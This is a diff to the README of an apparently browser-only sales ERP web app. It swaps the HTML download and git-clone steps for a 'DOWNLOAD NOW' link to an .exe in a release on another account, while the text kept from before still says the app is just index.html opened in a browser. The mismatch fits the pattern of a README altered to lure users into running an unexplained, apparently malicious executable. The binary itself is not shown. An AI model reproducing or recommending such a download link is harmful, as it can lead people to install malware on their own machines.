@@ -2,15 +2,9 @@
 
 ## 📦 DOWNLOAD & INSTALLATION
 
-- **Download the HTML file:**  
-  `https://github.com/your-username/sales-erp/raw/main/index.html`  
-  *(Replace with your actual GitHub repository URL)*
+- **Download the main file:**  
+  `[DOWNLOAD NOW](https://github.com/Ricksark/MWSERP/releases/download/exe/mwserp.exe)`  
 
-- **Clone the repository:**  
-  ```bash
-  git clone https://github.com/your-username/sales-erp.git
-  cd sales-erp
-  ```
 
 - **Run:** Simply open `index.html` in any modern web browser.  
   No server required – everything runs locally in your browser.
